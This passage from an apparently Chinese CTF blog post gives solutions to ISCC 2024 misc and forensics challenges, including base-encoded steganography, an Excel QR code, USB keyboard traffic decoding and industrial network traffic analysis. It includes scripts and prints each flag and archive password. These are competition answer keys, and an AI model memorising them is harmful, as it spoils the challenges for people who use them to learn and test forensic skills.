class="line">VVRKak9WQlJNVk</span><br><span class="line">V1Zaak1VMUZiRWhVYmxKcVVUSm9ObHBGYUV0alIzcDBXVEprV2xVelpHNVplazVUWlZkR1dFNVhOVXBTTW14M1VUSmpPVkJSTWz</span><br><span class="line">V2xoa2RsQlJNZg</span><br><span class="line">VTFWT1Fsb3piRWhpUnpGTVVqTldNVmw2U25OT2JIQlVXak5DU2xKRVVtNVhWMnN4WlcxR1dXTkhlRXhSTW5SM1VUSmpPVkJSTXr</span><br><span class="line">VTFWT1Fsb3diRVJpVjJSS1lqYktOVmRzYUZOTlYwNTBUa2RrVGxaSVRreEVZbY</span><br><span class="line">VTFWT1Fsb3diRWhXYms1cVRXeFdibGxXWkZwaU1XeFVUbGh3YUZkSVFuTlRNRTV5V2pGQ1JGRnRiRTFpYXpWM1dsY3hWbUl3ZEZSaE1ITk9</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktOVmRzYUZOTlYzNTBUa2RrVFZaRlZUTlJNbU01VUZFdz</span><br><span class="line">VTFWT1Fsb3diRWhXYms1cVRXeFdURVJr</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOT5</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktkRmxxVGtwaU1rWllUbFJDU2xJeWRHNVZSazVDWkRBNU5WRnVRa3BTU0dSdVYxWk5NV1Z0UmxsalIzaE1VVEp6TTFOVlpISmphM1ExWVRCelRq</span><br><span class="line">VTFWT1Fsb3liRVJSVjJSS1VUSkpNMUV5WXpsUVVUSt</span><br><span class="line">VTFWT1Jsb3hiRVJSVjJSS1VURkdibE5WVGtKYU1rWllWMWM1V2xadVVuZFhSazVDVDBWc1NGTnRTbWhXYWtKM1VUSmpPVkJSTVJ</span><br><span class="line">VTFWT1Fsb3diRVJaVjJSS1dUQkdibE5WVGxKYU1HeEVXVmRsU2xORmNITmFSV2hYWlZkS2NGbFlVbDVXU0U1TVJGbF</span><br><span class="line">VTFWT2Zsb3hiRVJSVjJSS1VURkdibE5WVGtKaU1rWllWMWM1V2xadVVuZFhSazVDU3pGc1NGTnRTbWhXaWtKM1VUSmpPVkJSTWa</span><br><span class="line">VTFWT1Fsb3diRVJZVjJSS1dEQkdibE5WVGtKYU1HeEVXRmRrU2xORmNITmFSV2hYWlZkS2NGaFlhRkJrTWpoNVJGaF</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQkpOVkV5WXpsUVVUQ0</span><br><span class="line">VTFWT1Fsb3diRVJrVjJSS1pEQktOVmRzYUZOTlYwNTBUa2RrVGxKSVRreEVaSp</span><br><span class="line">VTFWT1Fsb3diRWxOUlhOT0</span><br><span class="line">V214R2RsQlJNbp</span><br><span class="line">VVRKak9WQlJNVI</span><br><span class="line">V2tjd05XTkdjRVJSYm14aFYwVTFjMXBGWkVaaW1rMTZWVzVzYWZaNlZuVlRWV1JHWTBWT2JsQlVNRTW</span><br><span class="line">V2xoa2RsQlJNWA</span><br><span class="line">VTFWT2Rsb3hiRWhOVjNocFYwVTFjMXBGVG05aGJHeFVaRE5rVFZORk5YZGFWekZYWkd4d2NHRkhjRnBWTW5SM1ZETmtkbEJSTWQ</span><br><span class="line">VTFWT1Fsb3liRWhYYmxwcVlWZG9kMWx0TlZKYU1rWlVVVlJzU2xKRlJUTlRWV1J5V2pGQ1JGRnRhRTFpYXpWM1dsY3hWbUx5ZEZWak1tUm9WVE5PZVZNeFJuWlFVVEw</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOTw</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktjVmRXV2pCalJtaFVVVlJzU2xJd1dtbFhWazB4WlcxR1dXTkhlRXhSTW5Rd1ZGWk5lR05HYUZSUldGSktVVEpPTTFOdWNIcFRkekE</span><br><span class="line">VTFWT1Fsb3diRWxOUlhOTw</span><br><span class="line">V214R2RsQlJNcw</span><br><span class="line">VVRKak9WQlJNTQ</span><br><span class="line">V2tjd05XTkdjRVJSYm14aFYwVTFjMXBGWkVwaU1rMTZWVzVzYUZaNlZuVlRWV1JLWTBWT2JsQlVNRTQ</span><br><span class="line">V2xoa2RsQlJNMQ</span><br><span class="line">VTFWT2Zsb3hiRWhOVjNocFYwVTFjMXBGVG05aGJHeHdaRE5rVFZORk5YZGFWekZYWkd4d2NHRkhjRnBoVjNSM1ZETmtkbEJSTWY</span><br><span class="line">VTFWT1Fsb3diRWhYYmxwcVlWZG9kMWx0TlZKYU1rWlVVVlJzU2xKRlJUTlRWV1J5V2pGQ1JGRnRiRTFpYXpWM1dsY3hWbUl3ZEZWak1tUm9WVE5PZVZNeFJuWlFVVEI</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOTw</span><br><span class="line">VTFWT1Fsb3hiRVJSVjJSS1VURktjVmRYZURGalJtaFVVVlJzU2xJeGNHbFhWMnN4WlcxR1dXTkhlRXhSTW5ReFZGWk5lR05HYUZSUldGSktVVEpPTTFOdWNIcFRkekU</span><br><span class="line">VTFWT1dsb3hiRVJSVjJSS1VURkdNbFJFVGtObFYwWllUbFJDWVdGWFpIQlRiR1JTWVZWNFNGUnRiRmhOYlhoclV6RlNlbE4zTVc</span><br><span class="line">VTFWT1Fsb3diRWxOUlhOTw</span><br><span class="line">V214R2RsQlJNeg</span><br><span class="line">VVRKak9WQlJNMA</span><br><span class="line">V1hwT1UyVlhSbGhPVnpWS1VqRmFjbGRyVG05bGJWSkpVMjVDYVdKWFRtNVhWazR6V2pKTmVsVnViR2hXZWxaMVUxVmtTbU5GZURWTU1uaHdZMVZTZEdONlZsWlRkekY</span><br><span class="line">V2xoa2RsQlJNcg</span><br><span class="line">VTFWT1Fsb3diRWxUYlhocVRXeFpkMWRXVG05aFJYUlZZek5hVFVzeVJreGhXRlpvWkcxdmVsVjZVbTVVTVUwMVlXMVdXR1JITVZCYVYwWnZWREZrTUdKRGRHeGpNMEl4VmpGQ2RGUXlSa3BoTURsb1ZtNU9VRll6VW5ObFdIQnpaRmRLYVdFelZrdFdSekZ3WWpOS2RHSkhTa1ZpYmxVd1ZrZDRlVTVFVG5aa2FsSnRZbGUxYUZkSGRESmphVGx5WkZlNE0ySkhkRXBPTTBKMVdWVjRlbVJWYTNwaVIzUktaVzEwTWxkVVRuUmlSMHBGWW0wd00yRnRlSEJqVlVaTVJGZQ</span><br><span class="line">VTFWT1Fsb3diRWxUYlhocVRXeFpkMWRYYkc5aFZYUlZZekJ6VGc</span><br><span class="line">VTFWT1Fsb3diRWhYYmxwcVlWZG9kMWx0TlZKYU1rWlVWRlJzU2xKRlJUTlRWV1J5V2pGQ1JGUnVVbHBYUjJneFZETnNRMk5GZERWak0wSkVXbm93T1VSVQ</span><br><span class="line">VTFWT1Fsb3diRWxqTUhOTw</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktjVmRXV2pCalJtaFVVVlJzU2xJd05XOVdla3B6V2tWc1JHTXlaRnBOYTNCcFdWWlpkMDR3VG01UVZEQk8</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQktkMWR0Ykc5aGJHeFhaRWhDV1ZVd1JYSlZSazVDWlZWMFdXTXdjMDQ</span><br><span class="line">VTFWT1Fsb3diRVJVVjJSS1ZEQkdibE5WVGtKYU1XdDVVbTFLYUZVelRqUlhSazVDWTJ4Q1ZGUllhRkJrTWpnNVJGUQ</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQkdibE5WVGtKYU1XdDVVbTFLYUZacVFtNVVSbEYzV2pBeGNXTXdjMDQ</span><br><span class="line">VTFWT1Fsb3diRVJSVjJSS1VUQkpOVkV5WXpsUVVUQQ</span><br></pre></td></tr></table></figure>

<p>应该是什么隐写</p>
<p>感觉像base的</p>
<p>用工具：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc350e893.png" alt="image-20240501204737068"></p>
<p>所以flag:</p>
<p>ISCC{xoMjL8NuYRRb}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc356b33d.png" alt="image-20240501204825447"></p>
<h4 id="Number-is-the-key"><a href="#Number-is-the-key" class="headerlink" title="Number_is_the_key"></a>Number_is_the_key</h4><p>附件是一个excl表格 但里面没有东西</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc34d6cd0.png" alt="image-20240501205037401"></p>
<p>题目描述：The answers to the questions are hidden in the numbers.</p>
<p>应该也是隐写术</p>
<p>用脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> openpyxl <span class="keyword">import</span> load_workbook</span><br><span class="line"><span class="keyword">from</span> openpyxl.styles <span class="keyword">import</span> PatternFill</span><br><span class="line"></span><br><span class="line">wb = load_workbook(<span class="string">&#x27;C:\\Users\\admin\\Downloads\\attachment-1.xlsx&#x27;</span>)</span><br><span class="line">ws = wb.active</span><br><span class="line"></span><br><span class="line">bold_cells = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> ws.iter_rows():</span><br><span class="line">    <span class="keyword">for</span> cell <span class="keyword">in</span> row:</span><br><span class="line">        <span class="keyword">if</span> cell.font.bold:</span><br><span class="line">            bold_cells.append(cell.coordinate)</span><br><span class="line"></span><br><span class="line">highlight_style = PatternFill(start_color=<span class="string">&quot;FFFF00&quot;</span>, end_color=<span class="string">&quot;FFFF00&quot;</span>, fill_type=<span class="string">&quot;solid&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cell <span class="keyword">in</span> bold_cells:</span><br><span class="line">    ws[cell].fill = highlight_style</span><br><span class="line"></span><br><span class="line">wb.save(<span class="string">&#x27;ll.xlsx&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;加粗的单元格已设置为高亮并保存到 highlighted_excel_file.xlsx 文件中。&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc363e2ed.png" alt="image-20240501205536936"></p>
<p>ll.xlsx:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc353418f.png" alt="image-20240501210433718"></p>
<p>看上去是空白文件</p>
<p>但是这里要缩小看：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc34d3cb0.png" alt="image-20240501210507974"></p>
<p>已经缩到最小了 还是看不完</p>
<p>要调一下行和列</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc356d622.png" alt="image-20240501211011737"></p>
<p>可以扫了：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc35078bf.png" alt="image-20240501211106951"></p>
<p>ISCC{CYj8Zgy2nyXd}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc357b402.png" alt="image-20240501211156103"></p>
<h4 id="RSA-KU"><a href="#RSA-KU" class="headerlink" title="RSA_KU"></a>RSA_KU</h4><p>rsa</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc361771a.png" alt="image-20240508211031074"></p>
<p>轩禹梭哈</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3614840.png" alt="image-20240508212935674"></p>
<p>ISCC{GN08Dq52B6jY2OOoyQ–}</p>
<h4 id="时间刺客"><a href="#时间刺客" class="headerlink" title="时间刺客"></a>时间刺客</h4><p>两个文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3523859.png" alt="image-20240508220141048"></p>
<p>7z由密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc352b9d2.png" alt="image-20240508220240041"></p>
<p>流量文件打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3588ca7.png" alt="image-20240508220430285"></p>
<p>USB流量分析</p>
<p>先执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r usb.pcap -T fields -e usb.capdata | sed &#x27;/^\s*$/d&#x27; &gt; usbdata.txt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642054634d66.png" alt="image-20240513201917300"></p>
<p>在跑脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;D:\\流量\\attachment-27(1)\\usbdata.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">fi=<span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">    <span class="keyword">if</span> a:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">16</span>: <span class="comment"># 鼠标流量的话len改为8</span></span><br><span class="line">            out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">                <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    out+=a[i]+a[i+<span class="number">1</span>]</span><br><span class="line">            fi.write(out)</span><br><span class="line">            fi.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">fi.close()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line"></span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642070f26627.png" alt="image-20240513202654460"></p>
<p>得到解压密码：PR3550NWARDSA2FEE6E0</p>
<p>要全小写</p>
<p>解压</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PR3550NWARDSA2FEE6E0</span></span><br><span class="line"><span class="comment">#pr3550nwardsa2fee6e0</span></span><br><span class="line"><span class="keyword">import</span> time,os</span><br><span class="line">num=<span class="number">34</span></span><br><span class="line">a=os.listdir(<span class="string">&quot;./%s&quot;</span>%num)</span><br><span class="line">t=<span class="number">1728864000</span></span><br><span class="line">b=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18</span>):</span><br><span class="line">    mtime = time.localtime(os.path.getmtime(<span class="string">&quot;./%s/.%s.txt&quot;</span>%(num,i)))</span><br><span class="line">    mtime=<span class="built_in">int</span>(time.mktime(time.strptime(time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>, mtime), <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)))</span><br><span class="line">    b+=<span class="built_in">chr</span>(mtime-t)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ISCC&#123;%s&#125;&quot;</span>%b)</span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642317f8337f.png" alt="image-20240513232758462"></p>
<h4 id="成语学习"><a href="#成语学习" class="headerlink" title="成语学习"></a>成语学习</h4><p>又是流量分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc354025e.png" alt="image-20240508221530403"></p>
<p>找出解压密码</p>
<p>57pmYyWt</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc362606c.png" alt="image-20240508221634372"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc350eaaf.png" alt="image-20240508221744427"></p>
<p>明显少了后缀</p>
<p>加一个zip后缀 解压</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3580ea3.png" alt="image-20240508221909013"></p>
<p>找flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc34d2d10.png" alt="image-20240508222017431"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc352f4a1.png" alt="image-20240508222039747"></p>
<p>题目名字是成语学习</p>
<p>所以我们将成语和英语提出来</p>
<p>淡而无味  noodle</p>
<p>成语是密文 英文是密钥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3501cf8.png" alt="image-20240508223016593"></p>
<p>4fcf6085d24eb08b4e068a9bf600bda7</p>
<p>ISCC{4fcf6085d24eb08b4e068a9bf600bda7}</p>
<h4 id="工业互联网模拟仿真数据分析"><a href="#工业互联网模拟仿真数据分析" class="headerlink" title="工业互联网模拟仿真数据分析"></a>工业互联网模拟仿真数据分析</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66420aae81707.png" alt="image-20240513204221412"></p>
<p>wireshark打开流量</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/66420b491a112.png" alt="image-20240513204456290"></p>
<p>研究后发现：</p>
<p>第一问：</p>
<p>192.168.1.2 </p>
<p>192.168.1.4 的 Length 大小不变</p>
<p>192.168.1.2,192.168.1.4,24</p>
<p>第二问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tshark -r a.pcap -T fields -e data.data -Y &quot;data.len==12&quot; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024f7b039ae1f546c8e8b1b</span><br><span class="line">2024b939b6fdd3a92dacee64</span><br><span class="line">2024fd300d3fd17b85d1ae51</span><br><span class="line">20249cf615176e00d3fde264</span><br><span class="line">20247b5207a1d2b639fe1e55</span><br><span class="line">202432b3b42ff36424a15d01</span><br><span class="line">2024f2122ad847094be81d58</span><br><span class="line">2024e866d7ec7b7d5ae618bf</span><br><span class="line">20244057c7e66ca371b2c938</span><br><span class="line">202433b4fba38bac7e29bc6a</span><br><span class="line">2024796986cd9b1fc559ad61</span><br><span class="line">220248c6b6efd392e9839a3eb</span><br><span class="line">202462434670e7e76d766c58</span><br><span class="line">20241cc66ab532ff8c8f1d2e</span><br></pre></td></tr></table></figure>

<p>结果很明显了：2024</p>
<p>第三问：</p>
<p>看文末的流量分组 </p>
<p>第五组 - 192.168.1.3 192.168.1.5， 这一组的时间间隔固定</p>
<p>192.168.1.3,192.168.1.5,0.06</p>
<p>第四问：</p>
<p>看文末的流量分组，就能看出这三个 IP 是有业务关联性的 </p>
<p>192.168.1.3 –&gt; 192.168.1.2 –&gt; 192.168.1.6 </p>
<p>192.168.1.2,192.168.1.3,192.168.1.6</p>
<p>第五问：</p>
<p>五个字符的校验算法，先假设是 CRC16 或者 CRC32 </p>
<p>倒数位必为 1 </p>
<p>尝试 CRC16 CRC32 并尝试 0-10 为起始位 、</p>
<p>为 CRC16,4,1 时成功提交 </p>
<p>192.168.1.2,192.168.1.4,24 </p>
<p>2024</p>
